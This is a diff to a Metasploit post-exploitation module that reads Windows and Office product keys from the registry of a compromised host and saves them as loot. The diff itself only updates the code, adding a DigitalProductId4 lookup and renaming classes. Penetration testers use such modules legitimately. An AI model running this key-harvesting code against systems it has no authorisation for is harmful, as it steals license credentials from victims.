@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
 
   def initialize(info={})
@@ -22,7 +18,7 @@ class Metasploit3 < Msf::Post
   end
 
   def app_list
-    tbl = Rex::Ui::Text::Table.new(
+    tbl = Rex::Text::Table.new(
       'Header'  => "Keys",
       'Indent'  => 1,
       'Columns' =>
@@ -35,6 +31,7 @@ class Metasploit3 < Msf::Post
 
     keys = [
       [ "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DigitalProductId" ],
+      [ "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DigitalProductId4" ],
       [ "HKLM\\SOFTWARE\\Microsoft\\Office\\11.0\\Registration\\{91110409-6000-11D3-8CFE-0150048383C9}", "DigitalProductId" ],
       [ "HKLM\\SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-00CA-0000-0000-0000000FF1CE}", "DigitalProductId" ],
       [ "HKLM\\SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-0014-0000-0000-0000000FF1CE}", "DigitalProductId" ],
@@ -79,7 +76,7 @@ class Metasploit3 < Msf::Post
       results = tbl.to_csv
       print_line("\n" + tbl.to_s + "\n")
       path = store_loot("host.ms_keys", "text/plain", session, results, "ms_keys.txt", "Microsoft Product Key and Info")
-      print_status("Keys stored in: #{path.to_s}")
+      print_good("Keys stored in: #{path.to_s}")
     end
   end
 
@@ -130,5 +127,4 @@ class Metasploit3 < Msf::Post
     print_status("Finding Microsoft key on #{sysinfo['Computer']}")
     app_list
   end
-
 end
